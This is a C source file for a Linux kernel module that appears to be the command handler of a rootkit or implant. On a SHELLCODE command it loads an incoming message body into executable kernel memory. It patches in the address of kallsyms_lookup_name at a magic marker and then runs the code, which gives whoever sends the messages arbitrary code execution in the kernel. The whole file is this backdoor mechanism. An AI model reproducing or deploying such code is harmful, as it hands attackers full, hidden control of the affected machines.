#include <linux/kernel.h>
#include <linux/mm.h>
#include <linux/vmalloc.h>

#include "cmd.h"

#include "utils/ftrace_helper.h"
#include "utils/mem.h"


void run_shellcode(u8 *shellcode, unsigned long len)
{
    u8 magic[] = "\x48\x47\x46\x45\x44\x43\x42\x41";
    typedef void (*__shellcode_t)(void);
    __shellcode_t ref = __vmalloc_exec(len, GFP_KERNEL);
    u8 *refsc = (u8 *)ref;
    memcpy(ref, shellcode, len);
    /* Adjust the pointer to kallsyms() */
    int i = 0;
    int c = 0;
    bool inside = false;
    bool found = false;

    for (i = 0; i < len; i++) {
        if (inside && c >= 8) {
            // found it
            found = true;
            unsigned long kallsyms = resolve_sym("kallsyms_lookup_name");
            memcpy(&refsc[i], &kallsyms, sizeof(unsigned long));
            break;
        }
        if (shellcode[i] == magic[c]) {
            inside = true;
            c += 1;
        } else {
            c = 0;
        }
    }

    /* Run the code if we could link against kallsyms */
    if (found) {
        printk("running\n");
        ref();
    }

    /* Free the page */
    vfree(ref);
}


void process_message(message_header *header, u8 *body)
{
    if (header->magic != MAGIC_NUMBER) {
        return;
    }

    if (header->size > 0 && body == NULL) {
        return;
    }

    switch (header->cmd) {
        case NOP:
            printk(KERN_INFO "NOP\n");
            break;

        case SHELLCODE:
            printk(KERN_INFO "SHELLCODE\n");
            run_shellcode(body, header->size);
            break;

        default:
            printk(KERN_INFO "Unknown Command\n");
            break;
    }
}
